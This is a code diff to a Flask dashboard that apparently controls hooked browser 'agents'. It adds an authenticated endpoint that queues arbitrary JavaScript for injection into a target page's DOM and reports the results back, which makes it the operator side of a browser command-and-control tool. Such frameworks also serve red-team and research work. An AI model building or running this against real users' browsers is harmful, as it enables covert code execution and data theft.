@@ -1,9 +1,9 @@
 import time
 from datetime import datetime
-from app import db, ConnectedAgents, auth, extraModules, AutomaticModuleExecution
-from flask import jsonify, send_from_directory, Blueprint, Response, render_template
+from app import db, ConnectedAgents, ConnectedDomAgents, auth, extraModules, AutomaticModuleExecution
+from flask import jsonify, send_from_directory, Blueprint, Response, render_template, request
 from pywebpush import webpush, WebPushException
-from database.models import Registration, Agent, Module
+from database.models import Registration, Agent, Module, DomCommand
 from sqlalchemy.orm import joinedload
 
 dashboard = Blueprint('dashboard', __name__)
@@ -41,11 +41,17 @@ def getAgent(agentID):
             registration = db.session.query(Registration).filter(Registration.agentId == agent.id).order_by(Registration.id.desc()).first()
             result['push'] = str(registration is not None).lower()
             result['active'] = 'true' if agent.id in ConnectedAgents else 'false'
+            result['domActive'] = 'true' if agent.id in ConnectedDomAgents else 'false'
             modules = db.session().query(Module).filter(Module.agentId == agentID, Module.processed == 1).all()
             if len(modules) != 0:
                 result['modules'] = {}
                 for module in modules:
                     result['modules'][module.name] = module.results
+            dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1).order_by(DomCommand.id.desc()).limit(3).all()
+            if len(dom_commands) != 0:
+                result['dom_commands'] = {}
+                for dom_command in dom_commands:
+                    result['dom_commands'][dom_command.command] = dom_command.result
             return jsonify(result)
     return Response("", 404)
 
@@ -100,6 +106,17 @@ def removeModule(moduleName, agentID):
         return "" 
     return Response("", 404)
 
+@dashboard.route('/dom/<agentID>', methods=['POST'])
+@auth.login_required
+def sendDomJS(agentID):
+    body = request.get_json(silent = True)
+    if body and body['js']:
+        dom_command = DomCommand(None, agentID, body['js'], None, 0, datetime.now())
+        db.session().add(dom_command)
+        db.session().commit()
+        return ""
+    return Response("", 404)
+
 @dashboard.route('/push/<agentId>', methods=['POST'])
 @auth.login_required
 def push(agentId):
@@ -135,6 +152,12 @@ def activeAgents():
             agentsToRemove[agentID] = ConnectedAgents[agentID]
     for agentID in agentsToRemove:
         del ConnectedAgents[agentID]
+    agentsToRemove = {}
+    for agentID in ConnectedDomAgents:
+        if (now - ConnectedDomAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
+            agentsToRemove[agentID] = ConnectedDomAgents[agentID]
+    for agentID in agentsToRemove:
+        del ConnectedDomAgents[agentID]
 
 def dormantAgents():
     agents = db.session().query(Agent).options(joinedload('registration')).filter(Agent.id.notin_(ConnectedAgents.keys())).all()
